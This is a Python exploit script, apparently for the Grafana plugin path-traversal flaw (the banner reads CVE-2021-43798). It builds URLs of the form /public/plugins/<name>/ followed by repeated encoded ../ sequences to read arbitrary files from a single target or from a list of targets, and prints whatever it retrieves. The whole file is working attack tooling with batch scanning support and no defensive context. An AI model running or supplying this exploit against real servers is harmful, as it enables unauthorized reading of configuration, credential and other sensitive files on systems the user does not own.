import argparse
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
grafana任意文件读取利用！
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    parser.add_argument('-F','--filepath',help="please input reading filepath")
    parser.add_argument('-P', '--plugins', help="please input plugin name")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args

def attack(url,filepath,plugin):
    print("[+]trying attack")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    if filepath[:1] == '/':
        filepath = filepath[1:]
    else:
        filepath = filepath
    realurl = url + '/public/plugins/'+plugin+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F'+filepath
    try:
        res = requests.get(url=realurl)
        if res.status_code == 200:
            print("[+]attack success!waiting for result!")
            print("[+]\n"+res.text)
        else:
            print("[+]vuln is not exists")
    except Exception as e:
        print("[+]vuln is not exists")


def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[-1:]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
  _______      ________    ___   ___ ___  __        _  _  ____ ______ ___   ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || ||___ \____  / _ \ / _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_ __) |  / / (_) | (_) |
| |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _|__ <  / / \__, |> _ < 
| |____   \  /  | |____    / /_| |_| / /_ | |         | | ___) |/ /    / /| (_) |
 \_____|   \/   |______|  |____|\___/____||_|         |_||____//_/    /_/  \___/ 

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url,args.filepath,args.plugins)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i,args.filepath,args.plugins)
if __name__ =="__main__":
    main()
